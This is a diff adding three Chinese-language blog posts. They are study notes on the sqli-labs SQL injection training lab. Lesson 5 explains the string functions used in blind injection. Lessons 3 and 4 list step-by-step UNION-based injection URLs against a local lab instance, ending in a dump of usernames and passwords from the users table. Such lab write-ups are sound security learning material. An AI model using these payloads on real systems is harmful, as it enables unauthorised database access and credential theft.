@@ -246,6 +246,212 @@
 
 
   
+    <article id="post-sqlilab-lesson5" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/14/sqlilab-lesson5/">sqlilab-lesson5</a>
+    </h1>
+  
+
+        
+        <a href="/2022/01/14/sqlilab-lesson5/" class="archive-article-date">
+  	<time datetime="2022-01-14T08:35:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlilab-lesson5"><a href="#sqlilab-lesson5" class="headerlink" title="sqlilab lesson5"></a>sqlilab lesson5</h1><h2 id="预备知识（六个函数）"><a href="#预备知识（六个函数）" class="headerlink" title="预备知识（六个函数）"></a>预备知识（六个函数）</h2><h3 id="left（）函数"><a href="#left（）函数" class="headerlink" title="left（）函数"></a>left（）函数</h3><p>left（a，b） 指从左侧读取a的前b位正确则返还1，错误则返还0<br>例如select left（database（），1）=”s”（前一位是否是s）</p>
+<h3 id="regexp函数"><a href="#regexp函数" class="headerlink" title="regexp函数"></a>regexp函数</h3><p>从左向右匹配<br>例如select user() regexp ‘r’ （user()结果为root，regexp是匹配root的正则表达式，匹配第一个字符是否是r）</p>
+<h3 id="like函数"><a href="#like函数" class="headerlink" title="like函数"></a>like函数</h3><p>与regexp相似只是匹配内容后加入%，<br>例如select user() like ‘r%’(匹配第一个字符是否是r)</p>
+<h3 id="substr函数"><a href="#substr函数" class="headerlink" title="substr函数"></a>substr函数</h3><p>select substr(a,b,c)表示从b开始截取c长度的a字符<br>例如select substr((database()),1,1)=’s’;(匹配第一个字符是否是s)</p>
+<h3 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h3><p>将某个字符串转化为ascii值<br>例如select ascii(substr((select database()),1,1));直接回显115</p>
+<h3 id="chr函数-或-ord函数"><a href="#chr函数-或-ord函数" class="headerlink" title="chr函数 或 ord函数"></a>chr函数 或 ord函数</h3><p>chr(数字)<br>ord(“字母”)<br>使用python 中的两个函数可以判断当前ascii值是多少</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/14/sqlilab-lesson5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sqlilab-lesson4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/14/sqlilab-lesson4/">sqlilab-lesson4</a>
+    </h1>
+  
+
+        
+        <a href="/2022/01/14/sqlilab-lesson4/" class="archive-article-date">
+  	<time datetime="2022-01-14T08:35:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlilab-lesson4"><a href="#sqlilab-lesson4" class="headerlink" title="sqlilab lesson4"></a>sqlilab lesson4</h1><h2 id="less-3：（步骤）"><a href="#less-3：（步骤）" class="headerlink" title="less-3：（步骤）"></a>less-3：（步骤）</h2><h3 id="1、测试并根据报错信息判断注入类型"><a href="#1、测试并根据报错信息判断注入类型" class="headerlink" title="1、测试并根据报错信息判断注入类型"></a>1、测试并根据报错信息判断注入类型</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-4/?id=1%E2%80%9D)--+">http://127.0.0.1/sqli-labs/Less-4/?id=1”)--+</a></p>
+<h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) order by 3–+</p>
+<h3 id="3、判断哪些可回显"><a href="#3、判断哪些可回显" class="headerlink" title="3、判断哪些可回显"></a>3、判断哪些可回显</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) union select 1,2,3–+</p>
+<h3 id="4、查看数据库"><a href="#4、查看数据库" class="headerlink" title="4、查看数据库"></a>4、查看数据库</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<h3 id="5、查看此库中的所有表"><a href="#5、查看此库中的所有表" class="headerlink" title="5、查看此库中的所有表"></a>5、查看此库中的所有表</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;%EF%BC%89">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;）</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<h3 id="6、查看users中的列信息"><a href="#6、查看users中的列信息" class="headerlink" title="6、查看users中的列信息"></a>6、查看users中的列信息</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;%EF%BC%89">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;）</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<h3 id="7、查看所有字段"><a href="#7、查看所有字段" class="headerlink" title="7、查看所有字段"></a>7、查看所有字段</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users–+<br>与练习一、二。三相似，不同点在于注入类型要根据报错信息判断</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/14/sqlilab-lesson4/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-sqlilab-lesson3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/14/sqlilab-lesson3/">sqlilab-lesson3</a>
+    </h1>
+  
+
+        
+        <a href="/2022/01/14/sqlilab-lesson3/" class="archive-article-date">
+  	<time datetime="2022-01-14T08:34:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqlilab-lesson3"><a href="#sqlilab-lesson3" class="headerlink" title="sqlilab lesson3"></a>sqlilab lesson3</h1><h2 id="less-3：（步骤）"><a href="#less-3：（步骤）" class="headerlink" title="less-3：（步骤）"></a>less-3：（步骤）</h2><h3 id="1、测试并根据报错信息判断注入类型"><a href="#1、测试并根据报错信息判断注入类型" class="headerlink" title="1、测试并根据报错信息判断注入类型"></a>1、测试并根据报错信息判断注入类型</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-3/?id=1&#39;)--+">http://127.0.0.1/sqli-labs/Less-3/?id=1&#39;)--+</a></p>
+<h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>) order by 3–+</p>
+<h3 id="3、判断哪些可回显"><a href="#3、判断哪些可回显" class="headerlink" title="3、判断哪些可回显"></a>3、判断哪些可回显</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>) union select 1,2,3–+</p>
+<h3 id="4、查看数据库"><a href="#4、查看数据库" class="headerlink" title="4、查看数据库"></a>4、查看数据库</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>) union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<h3 id="5、查看此库中的所有表"><a href="#5、查看此库中的所有表" class="headerlink" title="5、查看此库中的所有表"></a>5、查看此库中的所有表</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;%EF%BC%89">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;）</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<h3 id="6、查看users中的列信息"><a href="#6、查看users中的列信息" class="headerlink" title="6、查看users中的列信息"></a>6、查看users中的列信息</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;%EF%BC%89">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;）</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<h3 id="7、查看所有字段"><a href="#7、查看所有字段" class="headerlink" title="7、查看所有字段"></a>7、查看所有字段</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>) union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users–+<br>与练习一、二相似，不同点在于注入类型要根据报错信息判断</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/14/sqlilab-lesson3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-sqlilab-lesson1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
